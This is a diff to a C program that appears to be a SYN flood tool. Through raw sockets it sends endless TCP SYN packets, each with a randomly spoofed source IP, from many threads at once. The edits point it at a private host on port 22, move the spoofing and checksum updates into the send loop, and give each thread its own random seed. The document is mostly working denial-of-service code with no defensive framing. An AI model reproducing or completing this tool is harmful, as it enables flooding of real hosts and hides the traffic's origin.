@@ -1,10 +1,11 @@
-#include "packets.h"
+#include "transfer.h"
+
 
 void *thread_handler(void *arg){
-    const char *server_ip = "127.0.0.1";
-    uint16_t port = 80;
+    const char *server_ip = "10.42.0.185";
+    uint16_t port = 22;
 
-    int sd = socket(AF_INET, SOCK_RAW, IP_HDRINCL);
+    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if(sd == -1){
         perror("socket error");
         exit(EXIT_FAILURE);
@@ -14,6 +15,7 @@ void *thread_handler(void *arg){
     IP_Header_t *iphead = (IP_Header_t *) malloc(sizeof(IP_Header_t));
     TCP_Header_t *tcphead = (TCP_Header_t *) malloc(sizeof(TCP_Header_t));
 
+    // convert ip from string to binary
     struct sockaddr_in dest_addr;
     dest_addr.sin_family = AF_INET;
     dest_addr.sin_port = htons(port);
@@ -26,20 +28,27 @@ void *thread_handler(void *arg){
 
     fill_SYN(iphead, tcphead, dest_addr.sin_addr.s_addr, dest_addr.sin_port);
 
-    uint32_t *rand = (uint32_t *) arg;
-    randomize_src(iphead, *rand);
+    // initialize rng
+    srand(*((uint32_t*) arg));
 
-    byte *ip_stream = serialize_ip_header(iphead);
-    byte *tcp_stream = serialize_tcp_header(tcphead);
-
-    byte *syn = form_packet(ip_stream, tcp_stream);
-    printf("\n");
-    bin_dump(syn, syn_len, LITTLE_ENDIAN);
-    printf("\n");
-    hexDump(syn, syn_len);
-    printf("\nPacket length: %lu\n\n", syn_len);
-    update_checksums(syn);
     while(1){
+        // get random number
+        uint32_t randnum = rand();
+
+        // randomize source address
+        IP_set_src_address(iphead, get_random_src_address(randnum));
+
+        // update checksums
+        IP_update_checksum(iphead);
+        TCP_update_checksum(tcphead, iphead);
+
+        // serialize
+        byte *ip_stream = serialize_ip_header(iphead);
+        byte *tcp_stream = serialize_tcp_header(tcphead);
+        //      combined serialized segments to form serialized packet
+        byte *syn = form_packet(ip_stream, tcp_stream);
+
+        // send packet
         if(sendto(sd, syn, syn_len, 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in)) < 0){
             perror("sendto error");
             exit(EXIT_FAILURE);
@@ -48,6 +57,7 @@ void *thread_handler(void *arg){
         }
         sleep(1);
     }
+
     close(sd);
     return NULL;
 }
@@ -55,9 +65,10 @@ void *thread_handler(void *arg){
 int main() {
     pthread_t ptid;
     srand(time(NULL));
-    uint32_t randnum = rand();
+    uint32_t randnum;
 
     for(int i = 0; i < IO_LIMIT; i++){
+        randnum = rand();
         int pt = pthread_create(&ptid, NULL, thread_handler, (void *) &randnum);
         if(pt != 0){
             perror("pthread error");
